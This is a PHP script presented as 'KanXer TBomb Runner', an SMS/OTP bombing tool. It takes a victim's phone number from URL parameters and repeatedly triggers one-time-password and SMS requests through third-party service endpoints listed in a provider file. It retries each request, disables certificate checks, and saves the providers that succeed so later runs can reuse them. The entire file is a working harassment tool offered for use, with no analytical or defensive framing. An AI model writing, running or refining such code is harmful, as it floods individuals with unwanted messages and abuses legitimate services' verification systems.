<?php
// ==============================
// KanXer TBomb Runner (Smart Mode)
// Developed by Lala 💚
// ==============================

error_reporting(0);
header("Content-Type: application/json");

$providerFile = __DIR__ . '/provider.json';
$workingFile  = __DIR__ . '/workingProviders.json';

if (!file_exists($providerFile)) {
    echo json_encode(["error" => "provider.json not found"]);
    exit;
}

$providers = json_decode(file_get_contents($providerFile), true);

// ---- Input ----
$cc = $_GET['cc'] ?? '91';
$target = $_GET['target'] ?? '';
$type = $_GET['type'] ?? 'sms';

if (!$target) {
    echo json_encode(["error" => "Missing parameter: target"]);
    exit;
}
if (!isset($providers[$type])) {
    echo json_encode(["error" => "Invalid type: $type"]);
    exit;
}

// ---- Provider Select ----
$countryProviders = $providers[$type][$cc] ?? $providers[$type]['multi'] ?? [];

if (!$countryProviders) {
    echo json_encode(["error" => "No providers found for country $cc"]);
    exit;
}

// ---- Improved runProvider ----
function runProvider($api, $cc, $target, $maxRetries = 5) {
    $attempt = 0;
    $success = false;
    $lastResponse = null;

    while ($attempt < $maxRetries && !$success) {
        $attempt++;
        $ch = curl_init();
        $method = strtoupper($api['method'] ?? 'GET');

        $url = str_replace(['{cc}', '{target}'], [$cc, $target], $api['url']);
        $params = $api['params'] ?? [];
        array_walk_recursive($params, function (&$v) use ($cc, $target) {
            if (is_string($v)) $v = str_replace(['{cc}', '{target}'], [$cc, $target], $v);
        });

        if (!empty($api['cc_target'])) {
            if ($method === 'POST') {
                $api['data'][$api['cc_target']] = $target;
            } else {
                $params[$api['cc_target']] = $target;
            }
        }

        $opts = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
        ];

        if ($method === 'GET' && !empty($params)) {
            $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($params);
        } elseif ($method !== 'GET') {
            if (isset($api['json'])) {
                $body = $api['json'];
                array_walk_recursive($body, function (&$v) use ($cc, $target) {
                    if (is_string($v)) $v = str_replace(['{cc}', '{target}'], [$cc, $target], $v);
                });
                $opts[CURLOPT_HTTPHEADER][] = 'Content-Type: application/json';
                $opts[CURLOPT_POSTFIELDS] = json_encode($body, JSON_UNESCAPED_SLASHES);
            } else {
                $data = $api['data'] ?? $params ?? [];
                array_walk_recursive($data, function (&$v) use ($cc, $target) {
                    if (is_string($v)) $v = str_replace(['{cc}', '{target}'], [$cc, $target], $v);
                });
                $opts[CURLOPT_HTTPHEADER][] = 'Content-Type: application/x-www-form-urlencoded';
                $opts[CURLOPT_POSTFIELDS] = http_build_query($data);
            }
            $opts[CURLOPT_POST] = true;
        }

        if (!empty($api['headers'])) {
            foreach ($api['headers'] as $k => $v) {
                $v = str_replace(['{cc}', '{target}'], [$cc, $target], $v);
                $opts[CURLOPT_HTTPHEADER][] = "$k: $v";
            }
        }

        $opts[CURLOPT_URL] = $url;
        curl_setopt_array($ch, $opts);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        $lastResponse = $response;
        $success = false;
        if (!$error && $httpCode >= 200 && $httpCode < 300 && is_string($response)) {
            $lower = strtolower($response);
            if (strpos($lower, 'otp') !== false ||
                strpos($lower, 'sent') !== false ||
                strpos($lower, 'success') !== false ||
                strpos($lower, 'request_id') !== false ||
                strpos($lower, 'true') !== false) {
                $success = true;
            }
            if (strpos($lower, 'error') !== false ||
                strpos($lower, 'fail') !== false ||
                strpos($lower, 'invalid') !== false) {
                $success = false;
            }
        }

        if (!$success) {
            // थोड़ी देर रुककर दोबारा प्रयास
            usleep(400000); // 0.4 सेकंड pause
        }
    }

    return [
        "name" => $api['name'] ?? 'Unknown',
        "success" => $success,
        "attempts" => $attempt,
        "http_code" => $httpCode ?? 0,
        "response_snippet" => is_string($lastResponse) ? substr($lastResponse, 0, 200) : null
    ];
}



// ---- Load Working Providers (if available) ----
$workingProviders = [];
if (file_exists($workingFile)) {
    $workingProviders = json_decode(file_get_contents($workingFile), true);
}

// ---- If none saved, test all ----
if (empty($workingProviders)) {
    $tested = [];
    foreach ($countryProviders as $api) {
        $r = runProvider($api, $cc, $target);
        $tested[] = $r;
        if ($r['success']) {
            $workingProviders[] = $api;
        }
        usleep(1000000);
    }
    // Save working ones
    file_put_contents($workingFile, json_encode($workingProviders, JSON_PRETTY_PRINT));
    $results = $tested;
} else {
    // Use only working providers
    $results = [];
    foreach ($workingProviders as $api) {
        $results[] = runProvider($api, $cc, $target);
        usleep(1000000);
    }
}

// ---- Output ----
echo json_encode([
    "status" => "completed",
    "country" => $cc,
    "target" => $target,
    "used_providers" => count($workingProviders) ?: count($countryProviders),
    "results" => $results
], JSON_PRETTY_PRINT);
?>
